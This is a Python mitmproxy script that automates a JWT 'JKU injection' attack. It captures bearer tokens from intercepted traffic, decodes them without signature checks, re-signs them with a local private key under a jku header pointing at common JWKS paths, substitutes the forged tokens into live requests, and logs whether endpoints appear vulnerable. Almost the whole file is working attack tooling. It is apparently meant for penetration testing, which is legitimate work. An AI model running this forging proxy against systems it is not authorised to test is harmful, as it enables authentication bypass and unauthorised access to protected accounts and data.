from mitmproxy import http
import jwt
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from datetime import datetime
from urllib.parse import urlparse
import json
import os

PRIVATE_KEY_PATH = "private_key.pem"
RESULT_FILE = "jwt_attack_results_script5.txt"
STATIC_ENDPOINT_FILE = "jwt_endpoints_static.txt"
DYNAMIC_ENDPOINT_FILE = "jwt_endpoints_dynamic.txt"

JWKS_PATHS = [
    "/.well-known/jwks.json",
    "/.well-known/openid-configuration",
    "/jwks.json",
    "/oauth/jwks",
    "/keys",
    "/auth/keys"
]

RSA_ALGS = {"RS256", "RS384", "RS512"}
HMAC_ALGS = {"HS256", "HS384", "HS512"}

baseline = {}          # (method, path) -> (status, size)
tested = set()
forged_token = None
jku_url = None
dynamic_endpoints = set()

# ---------------- helpers ----------------

def load_static_endpoints():
    if not os.path.exists(STATIC_ENDPOINT_FILE):
        return set()
    with open(STATIC_ENDPOINT_FILE) as f:
        return {line.strip() for line in f if line.strip()}

STATIC_ENDPOINTS = load_static_endpoints()

def log_dynamic(flow):
    key = f"{flow.request.method} {flow.request.path}"
    if key not in dynamic_endpoints:
        dynamic_endpoints.add(key)
        with open(DYNAMIC_ENDPOINT_FILE, "a") as f:
            f.write(key + "\n")

def log_result(flow, result, verdict, confidence):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    size = len(flow.response.content or b"")

    with open(RESULT_FILE, "a") as f:
        f.write(
            f"[{ts}]\n"
            f"ATTACK: JWT JKU Injection\n"
            f"METHOD: {flow.request.method}\n"
            f"URL: {flow.request.path}\n"
            f"STATUS: {flow.response.status_code}\n"
            f"RESPONSE_SIZE: {size} bytes\n"
            f"RESULT: {result}\n"
            f"VERDICT: {verdict}\n"
            f"CONFIDENCE: {confidence}\n"
            f"{'-'*60}\n\n"
        )

def get_token(flow):
    auth = flow.request.headers.get("Authorization", "")
    if auth.lower().startswith("bearer "):
        return auth[7:]
    for c in flow.request.cookies.values():
        if "." in c:
            return c
    return None

def get_origin(flow):
    parsed = urlparse(flow.request.pretty_url)
    return f"{parsed.scheme}://{parsed.netloc}"

def b64url(data: bytes):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# ---------------- forging (RSA only) ----------------

def forge_jku_token(token):
    global jku_url

    try:
        header = jwt.get_unverified_header(token)
        alg = header.get("alg")

        if alg not in RSA_ALGS:
            return None, alg

        payload = jwt.decode(token, options={"verify_signature": False})

        with open(PRIVATE_KEY_PATH, "rb") as f:
            private_key = serialization.load_pem_private_key(
                f.read(), password=None, backend=default_backend()
            )

        headers = {
            "alg": alg,
            "kid": header.get("kid", "mitm-key"),
            "jku": jku_url
        }

        forged = jwt.encode(payload, private_key, algorithm=alg, headers=headers)
        return forged, alg

    except Exception:
        return None, None

# ---------------- mitmproxy hooks ----------------

def request(flow: http.HTTPFlow):
    global forged_token, jku_url

    token = get_token(flow)
    if not token:
        return

    log_dynamic(flow)

    if forged_token is None:
        origin = get_origin(flow)

        for path in JWKS_PATHS:
            jku_url = origin + path
            forged_token, alg = forge_jku_token(token)

            if alg in HMAC_ALGS:
                forged_token = False
                return

            if forged_token:
                return  # baseline request untouched

    if forged_token:
        flow.request.headers["Authorization"] = f"Bearer {forged_token}"
        flow.metadata["jwt_mutated"] = True

def response(flow: http.HTTPFlow):
    key = (flow.request.method, flow.request.path)
    status = flow.response.status_code
    size = len(flow.response.content or b"")

    if key not in baseline:
        baseline[key] = (status, size)
        return

    if key in tested:
        return
    tested.add(key)

    base_status, base_size = baseline[key]

    # ---------------- verdict logic ----------------

    if forged_token and status == 200 and size != base_size:
        verdict = "VULNERABLE"
        result = "Application accepted attacker-controlled JKU and returned altered content"
        confidence = "HIGH"

    elif forged_token and status == 200:
        verdict = "POTENTIALLY VULNERABLE"
        result = "JKU header accepted on protected endpoint but no behavioral change observed"
        confidence = "MEDIUM"

    else:
        verdict = "NOT VULNERABLE"
        result = "JKU header ignored or signature verification enforced"
        confidence = "HIGH"

    log_result(flow, result, verdict, confidence)
